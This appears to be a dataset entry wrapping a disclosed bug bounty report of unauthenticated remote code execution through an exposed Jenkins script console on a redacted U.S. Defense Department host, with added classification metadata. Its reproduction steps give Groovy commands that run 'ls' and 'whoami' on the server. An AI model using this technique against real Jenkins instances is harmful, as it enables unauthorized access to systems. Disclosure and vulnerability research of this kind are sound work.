{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "brbsainath ",
  "title": "Unauth RCE on Jenkins Instance at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/",
  "content": "\nDescription:\nHi Team,\nWhile Doing Recon on U.s Government Sites, I Found below asset Belongs to U.S Government (Please Check its SSL certificate to confirm or Please check attached POC Video)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nhttps://\u2588\u2588\u2588/\nAttacker can execute Command Injection without Authentication.\nImpact\nUnauth RCE\nSystem Host(s)\n\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nNavigate to https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/_script\nPlease execute below commands to confirm Unauth RCE.\nCommands: println \"ls\".execute().text\nprintln \"whoami\".execute().text\n#POC\nPlease check Attached POC Video to follow steps (If Required)\n\u2588\u2588\u2588\u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1616633700,
  "report_url": "https://hackerone.com/reports/1125329",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Navigate to the vulnerable Jenkins instance at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/_script"
    ],
    [
      2,
      "Execute the following commands to confirm RCE: println \"ls\".execute().text and println \"whoami\".execute().text"
    ]
  ],
  "vuln_description": "Unauthenticated Remote Code Execution (RCE) vulnerability in a Jenkins instance, allowing attackers to execute arbitrary commands without authentication.",
  "reason": "The vulnerability involves a straightforward exploitation of a script console endpoint in Jenkins that is accessible without authentication. The attack does not require multiple components, complex state manipulation, or novel logic. The steps to reproduce are simple and do not involve subtle interactions between components.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "reasoning": "The Jenkins RCE vulnerability involves accessing the Groovy script console endpoint (`/_script`) directly, which is not part of regular user navigation. The methodology relies on discovering injectable parameters through regular browsing and testing them with simple payloads. Since the script console endpoint is unlikely to be logged during normal navigation (unless explicitly visited, which is not 'regular' behavior), the parameter enabling command injection would not be identified. Additionally, the payload execution (command injection via Groovy scripts) does not rely on stored XSS-like triggers or same-channel detection but directly returns results in the HTTP response, which might not align with the methodology's 'same channel' detection logic if the endpoint is not discovered in step 1.",
    "is_simple_injection": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves unauthenticated remote code execution (RCE) on a Jenkins instance, which is a case of authentication bypass (AuthN) and unauthorized access to functionality (AuthZ). The methodology described involves testing for AuthN/AuthZ bypass by executing actions with unauthenticated sessions or swapping user sessions. Since the reported issue allows command execution without any authentication, it falls under the scope of the methodology's step d) (executing actions with unauthenticated user sessions).",
    "is_detectable": true
  }
}